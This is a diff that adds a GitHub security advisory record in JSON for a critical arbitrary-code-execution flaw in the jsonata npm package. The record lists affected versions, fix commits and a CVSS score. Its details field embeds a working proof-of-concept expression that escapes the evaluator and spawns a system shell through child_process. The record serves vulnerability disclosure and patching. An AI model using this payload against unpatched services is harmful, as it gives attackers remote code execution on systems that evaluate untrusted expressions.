@@ -1,0 +1,116 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-66mm-25pp-rfff",
+  "modified": "2026-08-21T21:04:19Z",
+  "published": "2026-08-21T21:04:19Z",
+  "aliases": [
+    "CVE-2026-77415"
+  ],
+  "summary": "JSONata vulnerable to Arbitrary Code Execution via crafted JSONata expressions",
+  "details": "Before JSONata `2.2.1` and `1.8.8` it was possible to execute arbitrary code with\ncrafted expressions, due to:\n- overwriting `$clone` allowing mutation of objects via transforms (see\n[`evaluateTransformExpression`](https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1304-L1314))\n- it being possible to destruct jsonata functions/lambdas (e.g. `$merge.*`)\n- [applyProcedure](https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1670C20-L1675)\nusing `proc.arguments.forEach` and not `Array.prototype.forEach`\n\nWhich could be chained to execute arbitrary code.\n\nThis was fixed with:\n\n- https://github.com/jsonata-js/jsonata/pull/799\n(https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673)\n- https://github.com/jsonata-js/jsonata/pull/800\n- https://github.com/jsonata-js/jsonata/pull/802\n\nWhich are included in the `2.2.1` release. Fixes were then back-ported to the `1.8.8` release.\n\n## PoC\n\n```js\nimport jsonata from \"jsonata\";\n\nconst expression = jsonata(`\n(\n    $obj := {};\n    $clone := function($o) { $o };\n    $m := ($merge.*)[1];\n\n    $fn := function($a) {\n        (\n            $a({\"value\":\"lg\"},\"__lookupGetter__\");\n            $a({\"value\":\"x\"},\"x\");\n        )\n    };\n\n    $nop := function() { $ };\n\n    $capture := function($val) {\n        $obj ~> | $obj | {\"x\": 1, \"y\": 1, \"lg\":$lg} |\n    };\n\n    $ ~> | $ | $m([$nop,{\"_jsonata_lambda\":false}])|;\n    $ ~> | $ | {\"arguments\":{\"forEach\": $spread($fn)}}|;\n    $ ~> | $ | {\"body\":$m([$capture,{\"_jsonata_lambda\":false}]).body}|;\n    $func := $m([$,{\"_jsonata_lambda\":true}]);\n    $func();\n\n    $gP := $obj.lg(\"__proto__\");\n\n    $afn:=$spread($fn);\n    $afn{\"x\":$gP().constructor(\"return process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'})\")()};\n)\n`);\n\nawait expression.evaluate({});\n```\n\n## References\n\n- https://github.com/jsonata-js/jsonata/pull/799\n- https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673\n- https://github.com/jsonata-js/jsonata/commit/c41ef185136a7b96ca1049c7745a7503b82193de\n\n- https://github.com/jsonata-js/jsonata/pull/800\n- https://github.com/jsonata-js/jsonata/commit/d49dcdd01a4617e5601edda3ce9a971a791126dc\n\n- https://github.com/jsonata-js/jsonata/pull/802\n- https://github.com/jsonata-js/jsonata/commit/e362dfd686c1dadd1dd9324373819be446fd4f04",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "jsonata"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.0.0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "jsonata"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.8.8"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/security/advisories/GHSA-66mm-25pp-rfff"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/pull/799"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/pull/800"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/pull/802"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/commit/47c0e58542202c705726663166dbee5fcae47d06"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/commit/f174348c7fa30f271b63ddedf0767e814004bc4d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jsonata-js/jsonata"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-08-21T21:04:19Z",
+    "nvd_published_at": null
+  }
+}
